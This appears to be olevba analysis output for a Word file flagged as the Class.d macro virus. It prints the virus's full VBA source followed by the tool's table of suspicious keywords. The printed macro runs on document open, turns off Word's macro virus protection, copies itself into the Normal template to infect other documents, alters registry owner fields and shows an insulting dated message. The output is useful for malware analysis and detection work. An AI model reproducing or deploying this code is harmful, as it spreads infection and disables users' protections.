olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-037b273fdcb78f2990d3d1163799550eb34b793b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-037b273fdcb78f2990d3d1163799550eb34b793b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Const REG_SZ As Long = 1
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Const HKEY_CURRENT_USER As Long = &H80000001
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Sub AutoOpen()
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
On Error GoTo out
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Options.VirusProtection = False
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Options.SaveNormalPrompt = False
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Options.ConfirmConversions = False
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If nt > 70 And ad > 0 Then GoTo out
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If nt < 70 Then
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End If
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
host.codemodule.AddFromFile ("c:\class.sys")
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
With host.codemodule
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    For x = 1 To 16
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    .deletelines 1
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    Next x
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End With
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If nt < 70 Then
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    With host.codemodule
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    .replaceline 1, "Sub AutoClose()"
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    .replaceline 91, "Sub ToolsMacro()"
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    For x = 70 To 81
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
        .deletelines 62
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    Next x
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    .replaceline 35, "    For x = 1 To 4"
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    End With
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End If
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If nt < 70 Then
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
u = RegCloseKey(k)
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End If
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
With host.codemodule
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    For x = 2 To 104 Step 2
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
    Next x
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End With
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
out:
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End Sub
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
Sub ViewVBCode()
'Janis3/6/2001 3:08:26 PMHP DeskJet 690C Series v11.0 on LPT1:KLAÐU AUDZINÂTÂJU MK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

